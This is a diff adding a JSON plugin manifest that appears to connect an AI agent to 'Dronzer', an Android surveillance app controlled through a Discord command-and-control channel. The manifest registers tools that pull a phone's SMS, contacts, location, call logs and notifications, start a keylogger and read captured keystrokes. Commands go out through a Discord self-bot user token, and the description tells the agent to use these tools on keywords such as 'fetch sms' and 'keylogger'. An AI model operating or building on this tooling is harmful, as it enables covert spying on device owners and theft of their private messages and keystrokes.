@@ -1,0 +1,48 @@
+{
+  "id": "dronzer",
+  "name": "Dronzer Controller",
+  "description": "Control an Android device running the DRONZER app via Discord. Commands are sent using a User Token and responses are listened to via a Bot Token. When the user mentions 'dronzer', 'fetch devices', 'fetch sms', 'fetch contacts', 'fetch location', 'fetch call logs', 'fetch notifications', 'keylogger', or 'keylogs', use the corresponding dronzer_* tool.",
+  "activation": {
+    "onStartup": true
+  },
+  "contracts": {
+    "tools": [
+      "dronzer_fetch_devices",
+      "dronzer_fetch_location",
+      "dronzer_fetch_sms",
+      "dronzer_fetch_calllogs",
+      "dronzer_fetch_contacts",
+      "dronzer_fetch_notifs",
+      "dronzer_fetch_keys",
+      "dronzer_start_keylogger",
+      "dronzer_select_unit"
+    ]
+  },
+  "configSchema": {
+    "type": "object",
+    "properties": {
+      "botToken": {
+        "type": "string",
+        "description": "Discord Bot Token — used ONLY for listening to device responses. DO NOT use this to send commands."
+      },
+      "userToken": {
+        "type": "string",
+        "description": "Discord User Token (Self-Bot) — used to send !commands (like !sms, !devices) to the C2 channel. This is the primary dispatch token."
+      },
+      "channelId": {
+        "type": "string",
+        "description": "Discord Channel ID where Dronzer units are connected."
+      },
+      "timeoutMs": {
+        "type": "number",
+        "description": "Timeout for waiting for Dronzer response (ms).",
+        "default": 60000
+      }
+    },
+    "required": [
+      "botToken",
+      "channelId",
+      "userToken"
+    ]
+  }
+}
